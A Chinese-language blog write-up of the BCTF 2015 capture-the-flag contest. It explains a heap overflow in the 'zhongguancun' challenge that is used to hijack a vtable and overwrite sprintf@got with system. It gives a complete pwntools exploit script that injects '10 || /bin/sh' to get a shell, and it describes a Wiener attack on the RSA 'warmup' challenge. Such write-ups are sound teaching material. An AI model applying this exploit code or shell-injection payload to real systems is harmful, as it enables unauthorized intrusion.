---
title: BCTF writeup
author: rk700
layout: post
redirect_from: 
  - /article/2015/03/25/bctf-writeup
  - /article/2015/03/25/bctf-writeup/
tags:
  - exploit
  - crypto
---

周末参加了今年的第一次CTF，BCTF。由于这次CTF是面向国际的，所以题目的质量都比较高，种类也比较单纯，以逆向、溢出为主。这次确实是一个非常难得的锻炼机会，让我们体验到了国际水平CTF的难度。

我们队做出了5道题，我做出了zhongguancun和warmup。在这里记录下我思考的过程。

## zhongguancun

是我在周日下午才做出来的。（差距啊……）

我的习惯是，首先通读一遍IDA F5得到的伪代码。但读完后没有发现什么明显的漏洞。具体的，可以创建不同种类的商品，最多16个。有一个全局的数组保存这些商品的指针，而每个商品的结构体中，除了保存我们提供的描述信息、价格等，还在结构体的起始处存有函数指针数组。这里面的函数是在某些步骤下要调用的。此外，还可以汇总现有的商品，生成一个menu，里面记录了商品的所有信息。

第一天找溢出点就花了好久……因为一直没有发现那种很明显的覆盖。最后，是比较了malloc分给menu的大小和menu最多可能存放的内容长度，才发现了溢出点。而且要做到溢出还是比较苛刻的，不仅商品的数目要达到最大，每个商品里的信息长度也要最长，就连商品的价格也要使得printf打印出来的尽可能长（所以价格是负数，就为了多那一个负号）。这样的结果是，生成的menu的长度可以超过malloc分配的长度，覆盖后面的内容。

而menu和商品都是在heap上储存的，如果在menu的后面存有商品，那么上述的溢出就可以修改那个商品的结构体。通过实验发现，我们先生成menu，再添加商品，那么这新添加的商品在heap的地址就在menu的地址之后了。通过计算可得，溢出可以覆盖menu下一个block的前5个字符，所以正好可以覆盖那个商品保存的函数数组。于是我的想法是，先添加第一个商品（因为如果没有商品就不能生成menu），再生成menu；再添加15个商品，再次重新生成menu（用的地址还是前面分配给menu的地址）。这样的话，第二个商品的函数数组就被覆盖了。之后我们再对这个商品进行访问，就可以调用我们提供的函数了。

但是，到这里才刚开始……函数数组里有两个函数，每一个在调用之前都会做检查。如果往函数数组里读`/dev/zero`成功，那么就认为检查不通过。也就是说，要求我们覆盖后的地址是不可写的，GOT这种运行时可写的就不满足要求。这一点我觉得是这道题的关键（最后发现flag里也说到了这一点）

我试着打印.text段里包含的函数指针，发现没有找到什么好用的。最后只能将目光放在原本的函数数组上。这两个函数，一个是用来生成商品的menu内容，参数是商品指针和用来存放所生成字符串的地址；另一个则是计算价格，参数是商品指针和购买数量。我突然发现，如果在应该调用第二个函数时，调用了第一个，那么就可以实现往任意地址写内容了。这是因为，第二个参数--我们提供的购买数量，会被当作是要保存menu信息的字符串地址，`sprintf`往里面写内容。

然而到这里，这个向任意地址写内容的漏洞还是不太实用。因为`sprintf`所写的内容一直到非常靠后面才是我们可控的，即就是说为了修改某地址，我们需要从这个地址的前面就开始覆盖，而这就有一定的局限性。比如说要覆盖GOT第一个的`sprintf`，就需要从GOT前面很远的地方开始写，而不幸的是，那里是不可写的。这个问题也是困扰我比较久的一处。

最后发现了不自然的地方。（又是不自然之处，我觉得我很多题目都是从那些看上去很别扭的地方突破的）具体地，程序里预先定义了商品的不同类型，而且我们也只能选择其一，但这些商品类型字符串居然没有保存在`rodata`里面。一般来说这些都是字符串常量的。这就是不自然的地方。也就是说，我们利用前面的向任意地址写内容的漏洞，去修改这些商品类型字符串的内容；进一步，在后面再次调用有问题的生成menu信息的函数时，所用的商品类型信息变成了我们刚刚修改的，而这些信息恰好就被`sprintf`打印在最开始了。这就解决了上面提到的问题，不需要在目标地址之前开始覆盖了。

于是，我们有了一个可用的向任意地址写任意内容的漏洞。下面所做的，我首先是打印库函数地址来检查ASLR。因为有提供`libc.so`，所以通过某个函数地址泄露就可以得到`system`的地址。我是通过改写存放商品指针的数组内容来做到这一点的。具体地，改写存放所有商品指针的数组的某一项，然后在购买该项时选择"buy buy buy"，计算剩余金钱。这样就会取读这个商品指针后面`ptr+0x76`处的4 bytes作为商品的价格，于是由剩余的金钱就可以计算出商品的价格，即`ptr+0x76`处的内容。当然实际操作时，程序还会检查剩余金额需要非负。这一点，我们可以先买价格为负数的其他商品，使得总金钱变的足够大后再去买。

通过检查GOT里库函数地址，我发现虽然ASLR开启了，但库函数地址只有中间2个bytes被随机化了，也就是说最多只有256种可能，这和我见到的的ASLR相比太少了。这也直接导致我最后使用暴力碰撞地址的办法。因为时间紧迫，我没有分析出如何将计算得到的`system`的地址再写回（有知道的大牛请不吝赐教哈），而是猜测`system`的一个可能的地址，然后反复跑直到真正的地址恰好是我所猜测的。具体地，修改`sprintf@got`为这个我猜的`system`的地址，那么在执行计算价格时，`sprintf`会作用到某个字符串buf上，而那里正好存放的是刚刚读入的购买商品的个数。于是我如果输入`10 || /bin/sh`，那么`atoi`会返回10，通过检查，紧接着的`sprinf`就会变成调用`system("10 || /bin/sh")`，执行shell了。不过这里我后来想改`atoi@got`应该也可以，而且更方便。

于是，我开始一遍遍地跑，希望我猜测的地址能够碰上。跑了大概20几次，终于撞上了。得到flag是`BCTF{h0w_could_you_byp4ss_vt4ble_read0nly_ch3cks}`。好吧，readonly check，我也是第一次见到这样的，学习了。

下面是python代码，其中`system`的地址就是我猜测的。

{% highlight python %}
#!/usr/bin/env python2

from pwn import *
import sys

if __name__ == '__main__' :
    context(arch='i386', os='linux')
    elf = ELF('zhong')

    #ip = "127.0.0.1"
    ip = sys.argv[1]
    conn = remote(ip, 6666)

#store name
    payload = "a\n" + "A"*63 + "\n"
    conn.recvuntil("Your choice? ")
    conn.send(payload)

    genPhoneDes = 0x08049b74

#content of GOT before function addresses are resolved
#len 18
    gotB4=[0x080486c6, 0x080486d6, 0x080486e6, 0x080486f6, 0x08048706, 0x08048716, 0x08048726, 0xf7cc5570, 0x08048746, 0x08048756, 0x08048766, 0x08048776, 0x08048786, 0x08048796, 0x080487a6, 0x080487b6, 0x080487c6, 0x080487d6]
    
    system = 0xf7433da0
#rewrite the 1st entry(sprint) as system, and make sure the other function calls won't crash
    funcAddr = [system] + gotB4[1:]

#create the 1st product
    payload = "a\n" + "B"*31 + "\n4\n-1011111111\n" + "CC" + ''.join([p32(x) for x in funcAddr]) + p32(genPhoneDes) + "D\n"
    conn.recvuntil("Your choice? ")
    conn.send(payload)

#generate the menu
    conn.recvuntil("Your choice? ")
    conn.send("c\n")

#create the following product
    for i in range(1,16):
        conn.recvuntil("Your choice? ")
        conn.send(payload)

#generate the menu again
    conn.recvuntil("Your choice? ")
    conn.send("c\n")

#write to addr storing phone type string 
    blackberry = 0x0804b0fc
    payload = "d\nb\n2\nb\n" + str(blackberry-60) + "\n"
    conn.send(payload)
    
#rewrite sprintf@got
    sprintfGot = 0x0804b00c
    payload = "b\n" + str(sprintfGot) + "\n"
    conn.send(payload)
    conn.recvuntil("Your choice? ")

#calculate wholwsale price of another product
    payload = "c\nb\n5\nb\n"
    conn.send(payload)
    conn.recvuntil("How many do you plan to buy?")

#call sprintf which is system now
    cmd = "/bin/sh"
    payload = "10 || " + cmd + "\n"
    conn.send(payload)

    conn.interactive()
{% endhighlight %}

后记：阅读其他人的writeup，才知道可以不用暴力碰撞的……只需要通过对`atoi@got`进行一个相对的修改，改为`system`即可。而这是可以通过将`atoi@got`改为存放金钱的指针来完成，然后在减去花费的金额时就可以对那里操作了。太巧妙了！

## warmup

这道题只有50分，应该不难，但我是一直到周一凌晨1点多才做出来……

这道题是RSA，给了密文`c`和公钥文件，从中可以获得公钥`e`, `n`。发现`e`非常大，几乎和`n`是同阶的，这非常不自然，因为我常见到的`e`都是很小的。最后我是在查看RSA的wiki时，发现说密钥`d`应该足够大，否则会有Wiener攻击破解。而联想到这么大的`e`，我猜想`d`可能会很小，没想到试了下真的是这样……我是直接用[这里](https://github.com/pablocelayes/rsa-wiener-attack)的现成的代码，并且设置`sys.setrecursionlimit`为10000，用了大概一分多钟得到了密钥`d`。之后就是简单的指数运算，得到明文`p=0x424354467b3965745265613479217d`，即`BCTF{9etRea4y!}`。

## 感想

虽然我们的成绩并不是那么突出，但这次比赛还是很有意义的。其实从总体来看，感觉国内的队伍对web方面的题目还是比较熟练，国外队伍则是在溢出、逆向这些方面比较强。而这次比赛，有大量大分值的溢出逆向题目，所以最后的成绩，国内队伍和国际顶级队伍还是有不小差距。也许溢出逆向为主是国际比赛的主流风格了。不 管怎样，我相信我们国内的队伍也会在这方面不断提高的，我也希望能够和爱好信息安全的小伙伴们共同探讨学习，提高水平。

